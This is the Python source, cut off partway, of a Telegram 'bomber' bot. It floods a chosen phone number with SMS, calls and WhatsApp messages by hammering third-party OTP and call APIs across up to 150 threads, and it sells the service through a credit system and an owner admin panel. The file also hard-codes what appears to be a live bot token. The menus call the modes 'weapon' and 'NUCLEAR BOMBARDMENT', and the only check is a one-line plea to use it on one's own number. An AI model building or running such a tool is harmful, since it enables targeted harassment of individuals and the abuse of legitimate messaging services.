#!/usr/bin/env python3
"""
🔥 ULTIMATE PREMIUM BOMBER BOT v13.0 🔥
CRITICAL FIX - NO NESTED F-STRINGS
Works on Python 3.10, 3.11, 3.12+
"""

import asyncio
import logging
import sys
import time
import sqlite3
import os
import json
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timezone, timedelta

import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    filters, ContextTypes, CallbackQueryHandler
)

from apis import (
    SMS_APIS, CALL_APIS, WHATSAPP_APIS,
    TOTAL_SMS, TOTAL_CALL, TOTAL_WA, TOTAL_APIS
)

# ============================================================
# CONFIG
# ============================================================
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8658601721:AAGXredQKy1587U3QtTrihra9QiMK6tqTkM")
ADMIN_IDS = [1987818347]
ADMIN_USERNAME = "ObsidianXcore"
OWNER_ID = 1987818347

NORMAL_THREADS = 40
NORMAL_DELAY = 0.03
NORMAL_DURATION = 60
BRUTAL_THREADS = 80
BRUTAL_DELAY = 0.01
BRUTAL_DURATION = 180
ULTRA_THREADS = 150
ULTRA_DELAY = 0.005
ULTRA_DURATION = 300

TIMEOUT = 5
COOLDOWN_SECONDS = 50
BOMBS_PER_HOUR = 100
STARTING_CREDITS = 6
CREDIT_PER_BOMB = 1
PROGRESS_UPDATE_INTERVAL = 3

DB_FILE = "users.db"
AUDIO_FILE = "audios.json"
AUDIO_INDEX_FILE = "audio_index.json"

IST = timezone(timedelta(hours=5, minutes=30))


# ============================================================
# LOGGING
# ============================================================
logging.basicConfig(
    format='%(asctime)s | %(levelname)s | %(message)s',
    level=logging.INFO,
    handlers=[logging.FileHandler("bot.log"), logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger(__name__)
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("telegram").setLevel(logging.WARNING)


# ============================================================
# BUTTON HELPER
# ============================================================
def mk_btn(text, callback_data=None, url=None, style=None):
    kwargs = {"text": text}
    if callback_data is not None:
        kwargs["callback_data"] = callback_data
    if url is not None:
        kwargs["url"] = url
    if style:
        try:
            return InlineKeyboardButton(**kwargs, style=style)
        except TypeError:
            pass
    return InlineKeyboardButton(**kwargs)


# ============================================================
# FONTS
# ============================================================
def bold(text):
    result = []
    for ch in text:
        if 'A' <= ch <= 'Z':
            result.append(chr(0x1D5D4 + ord(ch) - ord('A')))
        elif 'a' <= ch <= 'z':
            result.append(chr(0x1D5EE + ord(ch) - ord('a')))
        elif '0' <= ch <= '9':
            result.append(chr(0x1D7EC + ord(ch) - ord('0')))
        else:
            result.append(ch)
    return ''.join(result)


def italic(text):
    result = []
    for ch in text:
        if 'A' <= ch <= 'Z':
            result.append(chr(0x1D608 + ord(ch) - ord('A')))
        elif 'a' <= ch <= 'z':
            result.append(chr(0x1D622 + ord(ch) - ord('a')))
        else:
            result.append(ch)
    return ''.join(result)


def spaced(text):
    return " ".join(bold(c) for c in text)


# ============================================================
# TIME
# ============================================================
def ist_now():
    return datetime.now(IST)


def current_time():
    return ist_now().strftime("%I:%M:%S %p")


def current_date():
    return ist_now().strftime("%d %B %Y")


def current_day():
    return ist_now().strftime("%A")


# ============================================================
# AUDIO
# ============================================================
def load_audios():
    try:
        if os.path.exists(AUDIO_FILE):
            with open(AUDIO_FILE, "r") as f:
                data = json.load(f)
                if isinstance(data, list):
                    return data
    except Exception:
        pass
    return []


def save_audios(audios):
    try:
        with open(AUDIO_FILE, "w") as f:
            json.dump(audios, f)
        return True
    except Exception:
        return False


def add_audio(file_id):
    audios = load_audios()
    if file_id in audios:
        return False, len(audios)
    audios.append(file_id)
    save_audios(audios)
    return True, len(audios)


def clear_all_audios():
    save_audios([])
    return True


def load_audio_index():
    try:
        if os.path.exists(AUDIO_INDEX_FILE):
            with open(AUDIO_INDEX_FILE, "r") as f:
                return int(json.load(f).get("index", 0))
    except Exception:
        pass
    return 0


def save_audio_index(idx):
    try:
        with open(AUDIO_INDEX_FILE, "w") as f:
            json.dump({"index": idx}, f)
        return True
    except Exception:
        return False


def get_next_audio():
    audios = load_audios()
    if not audios:
        return None
    idx = load_audio_index()
    if idx >= len(audios):
        idx = 0
    file_id = audios[idx]
    save_audio_index((idx + 1) % len(audios))
    return file_id


# ============================================================
# DATABASE
# ============================================================
def init_db():
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    c = conn.cursor()
    c.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            credits INTEGER DEFAULT 6,
            is_banned INTEGER DEFAULT 0,
            total_bombs INTEGER DEFAULT 0,
            total_requests INTEGER DEFAULT 0,
            last_bomb_time REAL DEFAULT 0,
            joined_at TEXT,
            last_active TEXT
        )
    """)
    conn.commit()
    conn.close()


def db_execute(query, params=(), fetch=None):
    conn = sqlite3.connect(DB_FILE, check_same_thread=False, timeout=10)
    c = conn.cursor()
    try:
        c.execute(query, params)
        if fetch == "one":
            result = c.fetchone()
        elif fetch == "all":
            result = c.fetchall()
        else:
            result = None
        conn.commit()
        return result
    finally:
        conn.close()


def get_user(user_id, username=None, first_name=None):
    row = db_execute("SELECT * FROM users WHERE user_id = ?", (user_id,), fetch="one")
    if not row:
        db_execute(
            "INSERT INTO users (user_id, username, first_name, credits, joined_at, last_active) VALUES (?, ?, ?, ?, ?, ?)",
            (user_id, username, first_name, STARTING_CREDITS,
             datetime.now().isoformat(), datetime.now().isoformat())
        )
        row = db_execute("SELECT * FROM users WHERE user_id = ?", (user_id,), fetch="one")
    else:
        db_execute("UPDATE users SET last_active = ? WHERE user_id = ?",
                   (datetime.now().isoformat(), user_id))
    return {
        "user_id": row[0], "username": row[1], "first_name": row[2],
        "credits": row[3], "is_banned": row[4],
        "total_bombs": row[5], "total_requests": row[6],
        "last_bomb_time": row[7], "joined_at": row[8],
        "last_active": row[9] if len(row) > 9 else row[8]
    }


def update_user(user_id, **kwargs):
    for k, v in kwargs.items():
        db_execute(f"UPDATE users SET {k} = ? WHERE user_id = ?", (v, user_id))


def deduct_credit(user_id):
    db_execute(
        "UPDATE users SET credits = credits - ? WHERE user_id = ? AND credits >= ?",
        (CREDIT_PER_BOMB, user_id, CREDIT_PER_BOMB)
    )


def add_credit(user_id, amount):
    db_execute("UPDATE users SET credits = credits + ? WHERE user_id = ?", (amount, user_id))


def remove_credit(user_id, amount):
    db_execute(
        "UPDATE users SET credits = MAX(0, credits - ?) WHERE user_id = ?",
        (amount, user_id)
    )


def get_all_users():
    return db_execute(
        "SELECT user_id, username, first_name, credits, is_banned, total_bombs FROM users ORDER BY joined_at DESC",
        fetch="all"
    ) or []


init_db()


# ============================================================
# STATE
# ============================================================
active_bombs = {}
user_history = defaultdict(list)
stats_global = {"total_bombs": 0, "total_requests": 0, "total_success": 0}
user_states = {}
pending_actions = {}


# ============================================================
# HELPERS
# ============================================================
def is_admin(user_id):
    return user_id in ADMIN_IDS


def is_owner(user_id):
    return user_id == OWNER_ID


def check_cooldown(user_id):
    user = get_user(user_id)
    last = user.get("last_bomb_time", 0) or 0
    elapsed = time.time() - last
    if elapsed < COOLDOWN_SECONDS:
        return False, int(COOLDOWN_SECONDS - elapsed)
    return True, 0


def check_rate_limit(user_id):
    now = time.time()
    hour_ago = now - 3600
    user_history[user_id] = [t for t in user_history[user_id] if t > hour_ago]
    if len(user_history[user_id]) >= BOMBS_PER_HOUR:
        return False, "🚫 " + bold("Hourly limit reached") + f" ({BOMBS_PER_HOUR}/hr)"
    return True, ""


def validate_number(phone):
    p = phone.strip().replace("+91", "").replace(" ", "").replace("-", "")
    return p.isdigit() and len(p) == 10


def clean_number(phone):
    return phone.strip().replace("+91", "").replace(" ", "").replace("-", "")


def get_url(api, phone):
    u = api["url"]
    return u(phone) if callable(u) else u


def get_data(api, phone):
    d = api.get("data")
    if d is None:
        return None
    return d(phone) if callable(d) else d


def progress_bar(percent, length=12):
    if percent < 0: percent = 0
    if percent > 100: percent = 100
    filled = int(length * percent / 100)
    return "▰" * filled + "▱" * (length - filled)


# ============================================================
# UI (NO NESTED F-STRINGS!)
# ============================================================
def hdr(title):
    inner = 26
    t = title.strip()
    calc = t.replace("*", "")
    total = len(calc)
    if total >= inner:
        display = t[:inner]
        left = 0
        right = 0
    else:
        left = (inner - total) // 2
        right = inner - total - left
        display = t
    return (
        "╔══════════════════════════╗\n"
        "║" + " " * left + " " + display + " " + " " * right + "║\n"
        "╚══════════════════════════╝"
    )


def div():
    return "━━━━━━━━━━━━━━━━━━━━━━━━━━"


def decor():
    return "🪼🪽🪬🪩🫧🪫🦋🦚🍁🍂"


def decor2():
    return "☄️🌍🍓🥂🍷🍫🍭🧩🎟🤹‍♀️"


def decor3():
    return "🏞🎑🕹ⲩ🧸🧬🦠📮📉📈"


def decor4():
    return "🔍🔎📝🦹‍♀️🧟‍♂️🧚‍♀️🧔🤖👾🐲"


def decor5():
    return "🪬🪩🫧🪫🦋🦚🍁🍂☄️🌍"


def decor6():
    return "🕹ⲩ🧸🧬🦠📮📉📈🔍🔎"


def bomb_art():
    return "🧊🥡❄ 🎯 ▼△▼△▼△▼△ ✙♠︎♩✧♪●♩○♬"


def music_player(playing):
    return (
        "🎧  𝑳𝒊𝒔𝒕𝒆𝒏𝒊𝒏𝒈: *" + playing + "*\n"
        "`01:43` ━━━━●───── `03:50`\n"
        "⇆ㅤ ㅤ◁ㅤ ❚❚ ㅤ▷ ㅤㅤ↻\n"
        "               ılıılıılıılıılıılı\n"
        "ᴠᴏʟᴜᴍᴇ : ▮▮▮▮▮▮▮▮▮▮"
    )


def cat_art():
    return (
        "　　｡ﾟﾟ･｡･ﾟﾟ｡\n"
        "         ﾟ。        ｡ﾟ\n"
        "             ﾟ･｡･ﾟ\n"
        "       ︵               ︵\n"
        "    (        ╲       /       /\n"
        "      ╲          ╲/       /\n"
        "           ╲          ╲  /\n"
        "          ╭ ‌   ╲           ╲\n"
        "     ╭ ‌   ╲        ╲       ﾉ\n"
        "╭ ‌   ╲        ╲         ╱\n"
        " ╲       ╲          ╱\n"
        "      ╲         ╱\n"
        "          ︶"
    )


def time_footer():
    return (
        "\n\n" + div() + "\n"
        "🕐  " + bold("India Time") + ":  `" + current_time() + "`\n"
        "📅  " + bold("Date") + ":  `" + current_date() + "`\n"
        "📆  " + bold("Day") + ":  `" + current_day() + "`"
    )


# ============================================================
# REQUEST SENDER
# ============================================================
def send_request(api, phone, stop_event):
    if stop_event.is_set():
        return 0
    try:
        url = get_url(api, phone)
        data = get_data(api, phone)
        headers = dict(api.get("headers", {}))
        method = api.get("method", "POST").upper()

        headers.setdefault(
            "User-Agent",
            "Mozilla/5.0 (Linux; Android 13; RMX3081) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
        )
        headers.setdefault("Accept", "*/*")
        headers.setdefault("Accept-Language", "en-IN,en;q=0.9")

        if method == "POST":
            r = requests.post(url, headers=headers, data=data, timeout=TIMEOUT)
        elif method == "GET":
            r = requests.get(url, headers=headers, timeout=TIMEOUT)
        elif method == "PUT":
            r = requests.put(url, headers=headers, data=data, timeout=TIMEOUT)
        else:
            r = requests.post(url, headers=headers, data=data, timeout=TIMEOUT)

        return 1 if r.status_code < 400 else 0
    except Exception:
        return 0


# ============================================================
# BOMB ENGINE
# ============================================================
async def execute_bomb(phone, api_list, stop_event, duration, threads, delay, progress_cb=None):
    total = 0
    success = 0
    failed = 0
    start = time.time()
    last_update = time.time()

    loop = asyncio.get_event_loop()
    executor = ThreadPoolExecutor(max_workers=threads)

    try:
        while not stop_event.is_set() and (time.time() - start) < duration:
            batch = []
            for api in api_list:
                if stop_event.is_set():
                    break
                fut = loop.run_in_executor(executor, send_request, api, phone, stop_event)
                batch.append(fut)
                total += 1

            if batch:
                results = await asyncio.gather(*batch, return_exceptions=True)
                for r in results:
                    if r == 1:
                        success += 1
                    else:
                        failed += 1

            if progress_cb and (time.time() - last_update) >= PROGRESS_UPDATE_INTERVAL:
                last_update = time.time()
                elapsed = int(time.time() - start)
                remaining = max(0, duration - elapsed)
                try:
                    await progress_cb(total, success, failed, elapsed, remaining)
                except Exception as e:
                    logger.debug(f"Progress cb: {e}")

            await asyncio.sleep(delay)
    finally:
        executor.shutdown(wait=False)

    return total, success, failed


# ============================================================
# NOTIFICATIONS
# ============================================================
async def notify_user(bot, user_id, title, message, kb=None):
    try:
        text = hdr(title) + "\n\n" + message + time_footer()
        await bot.send_message(
            chat_id=user_id, text=text,
            parse_mode=ParseMode.MARKDOWN, reply_markup=kb
        )
        return True
    except Exception as e:
        logger.debug(f"Notify user {user_id} failed: {e}")
        return False


async def notify_credits_added(bot, user_id, amount, total):
    title = "🎉  " + bold("CREDIT AAYA") + "  🎉"
    message = (
        decor5() + "\n"
        "┃  👤  " + bold("User ID") + ":  `" + str(user_id) + "`\n"
        "┃  ➕  " + bold("Added") + ":    `+" + str(amount) + "` credits\n"
        "┃  💎  " + bold("Total") + ":    `" + str(total) + "` credits\n"
        + decor5() + "\n\n"
        "🔥  _" + italic("Ab aap bombing kar sakte ho") + "!_\n\n"
        "💡  `/start` kar ke shuru karo\n"
        "👑  *" + bold("Thanks") + ":*  @" + ADMIN_USERNAME
    )
    return await notify_user(bot, user_id, title, message)


async def notify_credits_removed(bot, user_id, amount, total):
    title = "⚠️  " + bold("CREDIT KATA") + "  ⚠️"
    message = (
        decor6() + "\n"
        "┃  👤  " + bold("User ID") + ":  `" + str(user_id) + "`\n"
        "┃  ➖  " + bold("Removed") + ":  `-" + str(amount) + "` credits\n"
        "┃  💎  " + bold("Total") + ":    `" + str(total) + "` credits\n"
        + decor6() + "\n\n"
        "💬  _" + italic("Kuch samasya hai toh owner se baat karo") + "_"
    )
    return await notify_user(bot, user_id, title, message)


async def notify_banned(bot, user_id):
    title = "🚫  " + bold("YOU ARE BANNED") + "  🚫"
    message = (
        decor4() + "\n"
        "❌  *" + bold("Aapko ban kar diya gaya hai") + "!*\n\n"
        "📞  *" + bold("Contact") + ":*  @" + ADMIN_USERNAME + "\n\n"
        "💬  _" + italic("Owner se baat karein unban ke liye") + "_\n\n"
        + cat_art()
    )
    kb = InlineKeyboardMarkup([
        [mk_btn("📞  " + spaced("CONTACT OWNER"), url="https://t.me/" + ADMIN_USERNAME, style="success")],
    ])
    return await notify_user(bot, user_id, title, message, kb)


async def notify_unbanned(bot, user_id):
    title = "✅  " + bold("YOU ARE UNBANNED") + "  ✅"
    message = (
        decor5() + "\n"
        "🎉  *" + bold("Aap unban ho gaye ho") + "!*\n\n"
        "🔥  _" + italic("Welcome back!") + "_\n\n"
        "💡  `/start` kar ke shuru karo"
    )
    return await notify_user(bot, user_id, title, message)


# ============================================================
# KEYBOARDS
# ============================================================
def stop_button(chat_id):
    return InlineKeyboardMarkup([
        [mk_btn("🛑  " + spaced("STOP BOMBING") + "  🛑",
                callback_data="stop_" + str(chat_id), style="danger")]
    ])


def main_menu():
    return InlineKeyboardMarkup([
        [
            mk_btn("💱  " + spaced("SMS"),  callback_data="menu_sms",  style="primary"),
            mk_btn("♓  " + spaced("CALL"), callback_data="menu_call", style="primary"),
        ],
        [
            mk_btn("📟  " + spaced("WHATSAPP"), callback_data="menu_wa",  style="primary"),
            mk_btn("☎  " + spaced("ALL"),       callback_data="menu_all", style="primary"),
        ],
        [
            mk_btn("🦍  " + spaced("BRUTAL"), callback_data="menu_brutal", style="danger"),
            mk_btn("🦖  " + spaced("ULTRA"),  callback_data="menu_ultra",  style="danger"),
        ],
        [
            mk_btn("🚸  " + spaced("CUSTOM"), callback_data="menu_custom", style="success"),
        ],
        [
            mk_btn("🪙  " + spaced("CREDITS"), callback_data="menu_credits", style="success"),
            mk_btn("🔆  " + spaced("PROFILE"), callback_data="menu_profile", style="primary"),
        ],
        [
            mk_btn("🐾  " + spaced("STATS"), callback_data="menu_stats", style="primary"),
            mk_btn("💹  " + spaced("HELP"),  callback_data="menu_help",  style="primary"),
        ],
        [
            mk_btn("⛎  " + spaced("ABOUT"), callback_data="menu_about", style="primary"),
        ],
    ])


def owner_panel_kb():
    return InlineKeyboardMarkup([
        [
            mk_btn("👥  " + spaced("USER LIST"), callback_data="owner_userlist", style="success"),
            mk_btn("📊  " + spaced("STATS"),     callback_data="owner_stats",    style="primary"),
        ],
        [
            mk_btn("🎵  " + spaced("AUDIO MGR"), callback_data="owner_audiomgr", style="primary"),
        ],
        [
            mk_btn("📢  " + spaced("BROADCAST"), callback_data="owner_broadcast", style="primary"),
        ],
        [
            mk_btn("♻️  " + spaced("BACK"), callback_data="menu_back", style="primary"),
        ],
    ])


def user_action_kb(target_id, is_banned):
    ban_text = "✅  " + spaced('UNBAN') if is_banned else "🚫  " + spaced('BAN')
    ban_cb = "owner_unban_" + str(target_id) if is_banned else "owner_ban_" + str(target_id)
    ban_style = "success" if is_banned else "danger"

    return InlineKeyboardMarkup([
        [
            mk_btn("➕  " + spaced('ADD 1'),  callback_data="owner_add1_" + str(target_id), style="success"),
            mk_btn("➕  " + spaced('ADD 5'),  callback_data="owner_add5_" + str(target_id), style="success"),
        ],
        [
            mk_btn("➕  " + spaced('ADD 10'), callback_data="owner_add10_" + str(target_id), style="success"),
            mk_btn("➕  " + spaced('CUSTOM'), callback_data="owner_addcustom_" + str(target_id), style="primary"),
        ],
        [
            mk_btn("➖  " + spaced('REMOVE 1'), callback_data="owner_rem1_" + str(target_id), style="danger"),
            mk_btn("➖  " + spaced('REMOVE 5'), callback_data="owner_rem5_" + str(target_id), style="danger"),
        ],
        [
            mk_btn(ban_text, callback_data=ban_cb, style=ban_style),
        ],
        [
            mk_btn("⬅️  " + spaced('BACK TO LIST'), callback_data="owner_userlist", style="primary"),
        ],
    ])


def owner_audio_kb():
    return InlineKeyboardMarkup([
        [
            mk_btn("➕  " + spaced('ADD AUDIO'), callback_data="owner_addaudio_help", style="success"),
            mk_btn("▶️  " + spaced('PLAY ALL'), callback_data="owner_playaudio",    style="primary"),
        ],
        [
            mk_btn("📋  " + spaced('LIST AUDIOS'), callback_data="owner_listaudio", style="primary"),
            mk_btn("🔄  " + spaced('RESET'),       callback_data="owner_resetaudio", style="success"),
        ],
        [
            mk_btn("🗑️  " + spaced('DELETE ALL'), callback_data="owner_clearall_confirm", style="danger"),
        ],
        [
            mk_btn("♻️  " + spaced('BACK'), callback_data="owner_panel", style="primary"),
        ],
    ])


def back_button():
    return InlineKeyboardMarkup([
        [mk_btn("♻️  " + spaced('BACK'), callback_data="menu_back", style="primary")]
    ])


def back_and_bomb(menu_type):
    return InlineKeyboardMarkup([
        [mk_btn("🎯  " + spaced('ENTER NUMBER'), callback_data="enter_" + menu_type, style="success")],
        [mk_btn("♻️  " + spaced('BACK'), callback_data="menu_back", style="primary")],
    ])


def back_and_refresh(target):
    return InlineKeyboardMarkup([
        [mk_btn("🔄  " + spaced('REFRESH'), callback_data=target, style="success")],
        [mk_btn("♻️  " + spaced('BACK'), callback_data="menu_back", style="primary")],
    ])


def custom_menu_kb():
    return InlineKeyboardMarkup([
        [mk_btn("🎯  " + spaced('SEND NUMBER'), callback_data="enter_custom", style="success")],
        [mk_btn("♻️  " + spaced('BACK'), callback_data="menu_back", style="primary")],
    ])


def contact_owner_kb():
    return InlineKeyboardMarkup([
        [mk_btn("📞  " + spaced('CONTACT OWNER'), url="https://t.me/" + ADMIN_USERNAME, style="success")],
    ])


def user_list_kb(users, page=0, per_page=5):
    start = page * per_page
    end = start + per_page
    page_users = users[start:end]

    buttons = []
    for u in page_users:
        uid, uname, fname, credits, banned, bombs = u
        display_name = fname or uname or "User"
        if len(display_name) > 10:
            display_name = display_name[:10] + ".."
        status = "🚫" if banned else "✅"
        btn_text = status + " " + display_name + " · 💎" + str(credits)
        buttons.append([
            mk_btn(btn_text, callback_data="owner_view_" + str(uid),
                   style="danger" if banned else "primary")
        ])

    nav = []
    if page > 0:
        nav.append(mk_btn("⬅️  PREV", callback_data="owner_userlist_page_" + str(page - 1), style="primary"))
    if end < len(users):
        nav.append(mk_btn("NEXT  ➡️", callback_data="owner_userlist_page_" + str(page + 1), style="primary"))
    if nav:
        buttons.append(nav)

    buttons.append([mk_btn("♻️  " + spaced('BACK'), callback_data="owner_panel", style="primary")])

    return InlineKeyboardMarkup(buttons)


# ============================================================
# MENU TEXTS
# ============================================================
def sms_menu_text():
    title = "💱  " + bold('SMS BOMBING') + "  💱"
    return (
        hdr(title) + "\n\n"
        + decor() + "\n"
        "┃  🎯  " + bold('Target') + ":      Your Number\n"
        "┃  ⏱️  " + bold('Duration') + ":    `" + str(NORMAL_DURATION) + "` sec\n"
        "┃  🧵  " + bold('Threads') + ":     `" + str(NORMAL_THREADS) + "`\n"
        "┃  💎  " + bold('Cost') + ":        `1 Credit`\n"
        + decor() + "\n\n"
        "💡  _" + italic('Press ENTER NUMBER to start') + "_"
        + time_footer()
    )


def call_menu_text():
    title = "♓  " + bold('CALL BOMBING') + "  ♓"
    return (
        hdr(title) + "\n\n"
        + decor2() + "\n"
        "┃  🎯  " + bold('Target') + ":      Your Number\n"
        "┃  ⏱️  " + bold('Duration') + ":    `" + str(NORMAL_DURATION) + "` sec\n"
        "┃  🧵  " + bold('Threads') + ":     `" + str(NORMAL_THREADS) + "`\n"
        "┃  💎  " + bold('Cost') + ":        `1 Credit`\n"
        + decor2() + "\n\n"
        "💡  _" + italic('Press ENTER NUMBER to start') + "_"
        + time_footer()
    )


def wa_menu_text():
    title = "📟  " + bold('WHATSAPP BOMB') + "  📟"
    return (
        hdr(title) + "\n\n"
        + decor3() + "\n"
        "┃  🎯  " + bold('Target') + ":      Your Number\n"
        "┃  ⏱️  " + bold('Duration') + ":    `" + str(NORMAL_DURATION) + "` sec\n"
        "┃  🧵  " + bold('Threads') + ":     `" + str(NORMAL_THREADS) + "`\n"
        "┃  💎  " + bold('Cost') + ":        `1 Credit`\n"
        + decor3() + "\n\n"
        "💡  _" + italic('Press ENTER NUMBER to start') + "_"
        + time_footer()
    )


def all_menu_text():
    title = "☎  " + bold('ALL APIs BOMB') + "  ☎"
    return (
        hdr(title) + "\n\n"
        + decor4() + "\n"
        "┃  🎯  " + bold('Target') + ":      Your Number\n"
        "┃  ⏱️  " + bold('Duration') + ":    `" + str(NORMAL_DURATION) + "` sec\n"
        "┃  🧵  " + bold('Threads') + ":     `" + str(NORMAL_THREADS) + "`\n"
        "┃  💎  " + bold('Cost') + ":        `1 Credit`\n"
        + decor4() + "\n\n"
        "💡  _" + italic('Press ENTER NUMBER to start') + "_"
        + time_footer()
    )


def brutal_menu_text():
    title = "🦍  " + bold('BRUTAL MODE') + "  🦍"
    return (
        hdr(title) + "\n\n"
        + decor5() + "\n"
        "┃  🎯  " + bold('Target') + ":      Your Number\n"
        "┃  ⏱️  " + bold('Duration') + ":    `" + str(BRUTAL_DURATION) + "` sec\n"
        "┃  🧵  " + bold('Threads') + ":     `" + str(BRUTAL_THREADS) + "`\n"
        "┃  💎  " + bold('Cost') + ":        `1 Credit`\n"
        + decor5() + "\n\n"
        "🔥  *" + italic('ULTRA DESTRUCTION MODE') + "*\n\n"
        "💡  _" + italic('Press ENTER NUMBER to start') + "_"
        + time_footer()
    )


def ultra_menu_text():
    title = "🦖  " + bold('ULTRA MODE') + "  🦖"
    return (
        hdr(title) + "\n\n"
        + decor6() + "\n"
        "┃  🎯  " + bold('Target') + ":      Your Number\n"
        "┃  ⏱️  " + bold('Duration') + ":    `" + str(ULTRA_DURATION) + "` sec\n"
        "┃  🧵  " + bold('Threads') + ":     `" + str(ULTRA_THREADS) + "`\n"
        "┃  💎  " + bold('Cost') + ":        `1 Credit`\n"
        + decor6() + "\n\n"
        "☠️  *" + italic('NUCLEAR BOMBARDMENT') + "*\n\n"
        "💡  _" + italic('Press ENTER NUMBER to start') + "_"
        + time_footer()
    )


def custom_menu_text():
    title = "🚸  " + bold('CUSTOM MODE') + "  🚸"
    return (
        hdr(title) + "\n\n"
        + decor() + "\n"
        "┃  🎯  " + bold('Target') + ":      Your Number\n"
        "┃  ⏱️  " + bold('Duration') + ":    Your Choice\n"
        "┃  🧵  " + bold('Threads') + ":     `" + str(ULTRA_THREADS) + "`\n"
        "┃  💎  " + bold('Cost') + ":        `1 Credit`\n"
        + decor() + "\n\n"
        "💡  *" + bold('Format') + ":*  `/custom <number> <seconds>`\n"
        "📱  *" + bold('Example') + ":*  `/custom 9876543210 120`\n\n"
        "🎯  _" + italic('Or press SEND NUMBER button') + "_"
        + time_footer()
    )


def credits_menu_text(user):
    is_owner_user = is_owner(user["user_id"])
    credits_display = "∞  (Unlimited 👑)" if is_owner_user else "`" + str(user['credits']) + "`"

    title = "🪙  " + bold('CREDIT SYSTEM') + "  🪙"
    return (
        hdr(title) + "\n\n"
        + decor() + "\n"
        "┃  💎  " + bold('Your Credits') + ":  " + credits_display + "\n"
        "┃  🎁  " + bold('Cost per bomb') + ": `" + str(CREDIT_PER_BOMB) + "` credit\n"
        + decor() + "\n\n"
        "📖  *" + bold('Credit System') + ":*\n"
        "┃  ✨  _" + italic('Har ek bomb = 1 credit') + "_\n"
        "┃  🎁  _" + italic('New user = 6 free credits') + "_\n"
        "┃  👑  _" + italic('Owner = unlimited credits') + "_\n"
        "┃  📞  _" + italic('Khatam ho toh owner se lo') + "_\n"
        + decor() + "\n\n"
        "💡  _" + italic('Credits khatam par message aayega') + "_\n"
        "📞  *" + bold('Support') + ":*  @" + ADMIN_USERNAME
        + time_footer()
    )


# ============================================================
# COMMANDS
# ============================================================
async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    db_user = get_user(user.id, user.username, user.first_name)
    user_states.pop(user.id, None)
    pending_actions.pop(user.id, None)

    if db_user["is_banned"]:
        title = "🚫  " + bold('YOU ARE BANNED') + "  🚫"
        text = (
            hdr(title) + "\n\n"
            + decor4() + "\n"
            "❌  *" + bold('Aap banned ho') + "!*\n\n"
            "📞  *" + bold('Contact') + ":*  @" + ADMIN_USERNAME + "\n"
            "💬  _" + italic('Owner se baat karein unban ke liye') + "_"
            + decor4() + "\n\n"
            + cat_art() + time_footer()
        )
        await update.message.reply_text(
            text, parse_mode=ParseMode.MARKDOWN,
            reply_markup=contact_owner_kb()
        )
        return

    if is_owner(user.id):
        credits_display = "∞  👑 OWNER"
        status_icon = "👑 OWNER"
    else:
        credits_display = "`" + str(db_user['credits']) + "`"
        status_icon = "✅ Active"

    title = "👾  " + bold('ATTACK COMMAND') + "  🎛️"
    text = (
        hdr(title) + "\n\n"
        + decor() + "\n"
        "┃  👋  " + bold('Welcome') + ", *" + user.first_name + "*\n"
        "┃  🆔  " + bold('ID') + ":  `" + str(user.id) + "`\n"
        "┃  📛  " + bold('Username') + ":  @" + (user.username or 'N/A') + "\n"
        "┃  💎  " + bold('Credits') + ":  " + credits_display + "\n"
        "┃  ⭐  " + bold('Status') + ":  " + status_icon + "\n"
        + decor() + "\n\n"
        "⚡  *" + italic('Choose your weapon') + "*  👇\n\n"
        + cat_art() + time_footer()
    )

    kb = main_menu()
    if is_owner(user.id):
        kb = InlineKeyboardMarkup(
            [[mk_btn("👑  " + spaced('OWNER PANEL'), callback_data="owner_panel", style="danger")]]
            + list(kb.inline_keyboard)
        )

    await update.message.reply_text(
        text, parse_mode=ParseMode.MARKDOWN, reply_markup=kb
    )


async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    get_user(user.id, user.username, user.first_name)

    title = "💹  " + bold('HELP MENU') + "  💹"
    text = (
        hdr(title) + "\n\n"
        + decor2() + "\n"
        "⚡  *" + bold('Available Commands') + ":*\n"
        "┃\n"
        "┣  `/sms <num>`      ─  💱 _" + italic('SMS Bomb') + "_\n"
        "┣  `/call <num>`     ─  ♓ _" + italic('Call Bomb') + "_\n"
        "┣  `/whatsapp <num>` ─  📟 _" + italic('WA Bomb') + "_\n"
        "┣  `/all <num>`      ─  ☎ _" + italic('All APIs') + "_\n"
        "┣  `/brutal <num>`   ─  🦍 _" + italic('Brutal') + "_\n"
        "┣  `/ultra <num>`    ─  🦖 _" + italic('Ultra') + "_\n"
        "┣  `/custom <num> <sec>`  ─  🚸 _" + italic('Custom') + "_\n"
        "┃\n"
        "┣  `/stop`           ─  🛑 _" + italic('Stop') + "_\n"
        "┣  `/status`         ─  🐾 _" + italic('Stats') + "_\n"
        "┗  `/profile`        ─  🔆 _" + italic('Profile') + "_\n"
        + decor2() + "\n\n"
        "📱  *" + bold('Format') + ":*  10 digits\n"
        "✅  *" + bold('Example') + ":*  `9876543210`\n\n"
        + bomb_art() + "\n"
        "⚠️  _" + italic('Sirf apne number pe use karein') + "_"
        + time_footer()
    )
    await update.message.reply_text(
        text, parse_mode=ParseMode.MARKDOWN, reply_markup=back_button()
    )


async def profile_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    db_user = get_user(user.id, user.username, user.first_name)
    joined = db_user["joined_at"][:10] if db_user["joined_at"] else "N/A"
    last_active = db_user["last_active"][:16] if db_user.get("last_active") else "N/A"

    if is_owner(user.id):
        credits_display = "∞  (Unlimited 👑)"
        access = "👑 OWNER"
    else:
        credits_display = "`" + str(db_user['credits']) + "`"
        access = "💎 FULL ACCESS"

    title = "🔆  " + bold('YOUR PROFILE') + "  🔆"
    text = (
        hdr(title) + "\n\n"
        + decor3() + "\n"
        "┃  👤  " + bold('Name') + ":      `" + user.first_name + "`\n"
        "┃  🆔  " + bold('User ID') + ":   `" + str(user.id) + "`\n"
        "┃  📛  " + bold('Username') + ":  @" + (user.username or 'N/A') + "\n"
        "┃  📅  " + bold('Joined') + ":    `" + joined + "`\n"
